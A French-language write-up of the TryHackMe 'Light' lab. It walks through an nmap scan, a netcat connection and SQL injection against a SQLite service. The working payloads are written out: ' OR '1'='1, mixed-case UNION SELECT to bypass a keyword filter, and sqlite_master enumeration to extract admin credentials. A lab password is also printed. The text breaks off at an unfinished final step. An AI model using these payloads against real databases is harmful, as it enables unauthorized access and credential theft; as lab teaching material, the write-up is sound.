Présentation du lab

Nom : Light

Catégorie : Injection SQL / Sécurité des bases de données

Objectif : Identifier les services exposés, analyser une application connectée à SQLite, exploiter une injection SQL et retrouver les informations demandées par le challenge.

Outils utilisés : Nmap, Netcat (nc), SQLite (connaissances SQL).

Statut : Lab Résolu

Contexte : Les manipulations ci-dessous concernent exclusivement la machine du laboratoire TryHackMe. L'adresse IP est propre à cette session et peut changer.

1. Reconnaissance — Scan Nmap
   
Objectif
La première étape consiste à identifier les ports ouverts et les services actifs sur la machine cible.

Commandes utilisées

nmap -sC -sV -p 22,1337 adresse_ip_cible

Explication des options
- -sC : exécute les scripts Nmap par défaut.
- -sV : tente d'identifier les services et leurs versions.
- -p 22,1337 : limite l'analyse aux ports 22 et 1337.
- 
Résultat du scan
- Port 22/TCP : SSH, OpenSSH 8.2p1 (Ubuntu).
- Port 1337/TCP : service personnalisé, affichant un message de bienvenue de la base de données Light.

Analyse
Le port 22 correspond à un accès SSH, mais aucun identifiant SSH valide n'a été confirmé. Le port 1337 est le point d'entrée indiqué par le lab : il faut donc examiner le fonctionnement de ce service.

2. Connexion au service avec Netcat
Objectif

Interagir avec le service et comprendre les données qu'il accepte.

Commande utilisée
nc 10.130.134.26 1337

Explication
- nc : ouvre une connexion TCP vers un service.
- 10.130.134.26 : adresse IP de la machine du lab.
- 1337 : port du service Light.
- 
Résultat observé
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username:

Analyse
Le service demande un nom d'utilisateur puis renvoie un champ Password: lorsque l'utilisateur est trouvé. Il semble effectuer une recherche dans une base de données à partir de la valeur saisie.

3. Identification d'une injection SQL
   
Objectif
Vérifier si l'entrée utilisateur influence directement une requête SQL.
Saisie testée
' OR '1'='1
Résultat observé

Password: tF8tj*******

Analyse
La condition '1'='1' est toujours vraie. Le fait que le service retourne un mot de passe à partir de cette saisie est un indice fort d'une injection SQL. Ce résultat ne prouve pas, à lui seul, à quel compte appartient le mot de passe retourné.

Une tentative d'envoyer une requête SQL complète a également été rejetée :

Ahh there is a word in there I don't like :(
Le service semble donc filtrer certains mots ou motifs SQL.

4. Analyse du filtrage SQL
   
Objectif

Comprendre les restrictions appliquées par le service avant l'exécution des requêtes.

Observations
- Des mots-clés SQL écrits en majuscules, comme UNION SELECT, ont déclenché le message de filtrage.
- Une écriture mixte, UniOn SeleCt, a permis d'exécuter une requête d'énumération.
- Les séquences de commentaire --, /* et %0b ont été explicitement refusées par le service.
Exemple de message
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Analyse
Le filtrage observé paraît sensible à la casse. Cela montre qu'une simple liste de mots interdits ne suffit pas à empêcher une injection SQL. Une défense fiable repose notamment sur des requêtes paramétrées.

5. Énumération des tables SQLite
Objectif

Découvrir les tables de la base de données sans connaître leur nom à l'avance.
Saisie utilisée
' UniOn SeleCt name FROM sqlite_master WHERE type='table
Résultat observé
Password: admintable

Explication
- UniOn SeleCt : ajoute une sélection SQL à la requête initiale.
- name : récupère le nom des objets répertoriés.
- sqlite_master : table système SQLite contenant le schéma de la base.
- WHERE type='table : sélectionne les objets de type table ; le guillemet de fermeture est fourni par la requête construite par l'application.

Analyse
Cette injection a permis d'identifier la table admintable. Une autre table, usertable, a ensuite été confirmée par la lecture de sa définition.

6. Récupération de la structure des tables
Objectif
Identifier les colonnes présentes dans les tables découvertes.

6.1. Structure de admintable

Saisie utilisée :
' UniOn SeleCt sql FROM sqlite_master WHERE name='admintable
Résultat observé :
CREATE TABLE admintable (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password INTEGER
)

6.2. Structure de usertable
Saisie utilisée :
' UniOn SeleCt sql FROM sqlite_master WHERE name='usertable
Résultat observé :
CREATE TABLE usertable (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password INTEGER
)

Analyse
Les deux tables possèdent la même structure :
Colonne	Type SQLite	Rôle probable
id	INTEGER PRIMARY KEY	Identifiant unique
username	TEXT	Nom d'utilisateur
password	INTEGER	Valeur du champ mot de passe


Remarque : SQLite utilise un typage flexible ; le type déclaré INTEGER ne garantit pas à lui seul que toutes les valeurs de la colonne sont numériques.

7. Compréhension des erreurs de syntaxe

Objectif

Comprendre pourquoi certaines injections ont échoué.
Exemple de saisie
' UniOn SeleCt username FROM admintable
Résultat observé
Error: unrecognized token: "' LIMIT 30"
Analyse
L'application semble ajouter un guillemet simple et une clause LIMIT 30 après la saisie. Une injection qui ne tient pas compte de cette construction peut provoquer une erreur SQL.

Une tentative utilisant LIKE a également échoué :
' UniOn SeleCt username FROM admintable WHERE username LIKE 'a%'
Error: unrecognized token: "'a%'' LIMIT 30"
La leçon importante est d'examiner les messages d'erreur pour comprendre comment l'application construit ses requêtes, plutôt que de répéter des commandes au hasard.

8. Identification du nom d'utilisateur administrateur
Objectif
Récupérer le nom d'utilisateur présent dans admintable.
Saisie proposée pendant l'analyse
' UniOn SeleCt username FROM admintable WHERE '1'='1
Cette forme termine la requête par une comparaison dont le dernier guillemet peut être fourni par l'application. Le journal partagé ne contient pas la sortie complète de cette commande, mais le résultat communiqué à l'issue de cette étape est :
TryHackMeAdmin

Résultat de la question 1
Nom d'utilisateur administrateur : TryHackMeAdmin

9. Recherche du mot de passe administrateur
Objectif

Récupérer le champ password associé au compte administrateur.

Saisie à vérifier dans le lab
' UniOn SeleCt password FROM admintable WHERE username='TryHackMeAdmin

10- Resolution du lab 

Ce connecter et trouver le flag 
